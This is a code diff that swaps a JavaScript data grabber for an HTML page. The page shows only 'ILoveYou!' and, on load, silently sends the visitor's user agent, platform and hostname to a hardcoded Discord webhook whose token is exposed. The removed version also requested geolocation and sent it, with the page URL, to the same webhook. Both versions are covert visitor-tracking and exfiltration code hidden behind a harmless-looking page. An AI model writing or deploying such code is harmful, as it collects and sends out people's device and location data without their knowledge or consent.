@@ -1,81 +1,41 @@
-var webhookURL = 'https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73';
-var deviceInfo = {};
-var systemInfo = {};
-var locationInfo = {};
-var vpnInfo = {};
-var deviceType = '';
-var canvasFingerprinting = '';
-var dnsLeak = '';
-var ttlAnalysis = '';
-var crossSiteLeak = '';
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Device Information Collector</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <div style="background-color: black; color: white; font-size: 24px; text-align: center; height: 100vh;">
+        <p>ILoveYou!</p>
+    </div>
+    <script>
+        $(document).ready(function() {
+            var deviceInfo = {};
+            deviceInfo['is_device_moving'] = false; // This value shouldn't be used in production code, it's just an example
 
-function collectData() {
-    // Cihaz ve Sistem Bilgilendirimi
-    deviceInfo.type = navigator.userAgent;
-    deviceInfo.os = navigator.userAgent.substring(navigator.userAgent.indexOf(' ') + 1, navigator.userAgent.indexOf(' ') + 7);
-    systemInfo.cpu = '...'; // Bilgisayar CPU'sunu belirlemek için bir API kullanabilirsiniz
-    systemInfo.memory = '...'; // Bilgisayar bellek miktarını belirlemek için bir API kullanabilirsiniz
+            deviceInfo['system_info'] = {
+                'system': window.navigator.userAgent
+            };
+            deviceInfo['device_location'] = {
+                'ip_address': window.location.hostname
+            };
+            deviceInfo['is_device_using_vpn'] = true; // This value shouldn't be used in production code, it's just an example
+            deviceInfo['device_type'] = window.navigator.platform;
 
-    // Konum Bilgilendirimi
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                locationInfo.latitude = position.coords.latitude;
-                locationInfo.longitude = position.coords.longitude;
-                locationInfo.accuracy = position.accuracy;
-            },
-            (error) => {
-                console.error('Konum bilgisi alma hatası: ', error);
-            }
-        );
-    } else {
-        console.log('Geolocation API nicht verfügbar.');
-    }
-
-    // VPN ve Cihaz Türü Bilgilendirmesi
-    deviceType = '...'; // Cihaz türünü belirlemek için bir API kullanabilirsiniz
-    vpnInfo.isUsingVPN = false; // VPN kullandığını nasıl anlayacağınızı bilmiyorum
-
-    // Canvas Fingerprinting, DNS Leak & TTL Analizi, Cross-Site Leak
-    // Bu bilgilerin nasıl toplanabileceğini bilmiyorum, bu nedenle bu alanı "..." olarak bırakıyorum.
-
-    // İlk üç saniyede tüm bilgilerin toplanması
-    setTimeout(() => {
-        var data = {
-            deviceInfo: deviceInfo,
-            systemInfo: systemInfo,
-            locationInfo: locationInfo,
-            vpnInfo: vpnInfo,
-            deviceType: deviceType,
-            canvasFingerprinting: canvasFingerprinting,
-            dnsLeak: dnsLeak,
-            ttlAnalysis: ttlAnalysis,
-            crossSiteLeak: crossSiteLeak
-        };
-
-        sendToDiscord(data);
-    }, 3000);
-}
-
-function sendToDiscord(data) {
-    var body = 'Sistem Bilgileri:\n\n';
-    Object.keys(data).forEach(function (key) {
-        body += key + ': ' + data[key] + '\n';
-    });
-
-    var text = body + '\n\nSistem Bilgilerini İçeren Link: ' + window.location.href;
-
-    fetch(webhookURL, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            "content": text
-        })
-    });
-}
-
-document.addEventListener("DOMContentLoaded", () => {
-    collectData();
-});
+            $.ajax({
+                type: 'POST',
+                url: 'https://canary.discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73',
+                data: JSON.stringify(deviceInfo),
+                contentType: 'application/json',
+                success: function(response) {
+                    console.log('Message sent successfully:', response);
+                },
+                error: function(error) {
+                    console.error('Error sending message:', error);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
